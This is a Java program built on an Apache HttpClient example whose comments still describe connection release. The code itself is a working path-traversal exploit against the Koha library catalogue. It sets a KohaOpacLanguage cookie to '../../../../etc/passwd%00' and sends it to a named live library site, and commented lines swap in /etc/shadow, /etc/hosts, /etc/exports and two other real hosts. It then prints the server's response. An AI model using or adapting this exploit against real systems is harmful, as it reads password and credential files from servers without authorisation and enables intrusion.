/*
 * ====================================================================
 * Licensed to the Apache Software Foundation (ASF) under one
 * or more contributor license agreements.  See the NOTICE file
 * distributed with this work for additional information
 * regarding copyright ownership.  The ASF licenses this file
 * to you under the Apache License, Version 2.0 (the
 * "License"); you may not use this file except in compliance
 * with the License.  You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing,
 * software distributed under the License is distributed on an
 * "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
 * KIND, either express or implied.  See the License for the
 * specific language governing permissions and limitations
 * under the License.
 * ====================================================================
 *
 * This software consists of voluntary contributions made by many
 * individuals on behalf of the Apache Software Foundation.  For more
 * information on the Apache Software Foundation, please see
 * <http://www.apache.org/>.
 *
 */

package com.techletsolutions.yashpal;

import java.io.IOException;
import java.io.InputStream;

import org.apache.http.HttpEntity;
import org.apache.http.client.CookieStore;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.protocol.HttpClientContext;
import org.apache.http.impl.client.BasicCookieStore;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.impl.cookie.BasicClientCookie;
import org.apache.http.util.EntityUtils;

/**
 * This example demonstrates the recommended way of using API to make sure
 * the underlying connection gets released back to the connection manager.
 */
public class ClientConnectionRelease {

    public final static void main(String[] args) throws Exception {
        CloseableHttpClient httpclient = HttpClients.createDefault();
        try {
            HttpGet httpget = new HttpGet("http://www.library.britishcouncil.org.in/");
        	//HttpGet httpget = new HttpGet("http://opac.ylibrary.com/");
        	//HttpGet httpget = new HttpGet("http://lib.techletsolutions.com/");
            BasicClientCookie netscapeCookie = new BasicClientCookie("KohaOpacLanguage", "../../../../../../../../etc/passwd%00");
//            BasicClientCookie netscapeCookie = new BasicClientCookie("KohaOpacLanguage", "../../../../../../../../etc/hosts%00");
            //BasicClientCookie netscapeCookie = new BasicClientCookie("KohaOpacLanguage", "../../../../../../../../etc/exports%00");
            //BasicClientCookie netscapeCookie = new BasicClientCookie("KohaOpacLanguage", "../../../../../../../../etc/shadow%00");
           
            netscapeCookie.setDomain(".britishcouncil.org.in");
            //netscapeCookie.setDomain(".ylibrary.com");
            //netscapeCookie.setDomain(".techletsolutions.com");
        	netscapeCookie.setVersion(0);
            netscapeCookie.setPath("/");
            
            // Create a local instance of cookie store
            CookieStore cookieStore = new BasicCookieStore();

            cookieStore.addCookie(netscapeCookie);
            // Create local HTTP context
            HttpClientContext localContext = HttpClientContext.create();
            // Bind custom cookie store to the local context
            localContext.setCookieStore(cookieStore);
            
            
            System.out.println("Executing request " + httpget.getRequestLine());
            CloseableHttpResponse response = httpclient.execute(httpget, localContext);
            try {
                System.out.println("----------------------------------------");
                System.out.println(response.getStatusLine());

                // Get hold of the response entity
                HttpEntity entity = response.getEntity();
                
               System.out.println(EntityUtils.toString(entity));

                // If the response does not enclose an entity, there is no need
                // to bother about connection release
                if (entity != null) {
                    InputStream instream = entity.getContent();
                    try {
                    	
                    	if (instream.available() > 0){
                        instream.read();   
                    	}
                    	System.out.println("Testing....");
                    	
                    	// do something useful with the response
                    } catch (IOException ex) {
                        // In case of an IOException the connection will be released
                        // back to the connection manager automatically
                        throw ex;
                    } finally {
                        // Closing the input stream will trigger connection release
                        instream.close();
                    }
                }
            } finally {
                response.close();
            }
        } finally {
            httpclient.close();
        }
    }

}

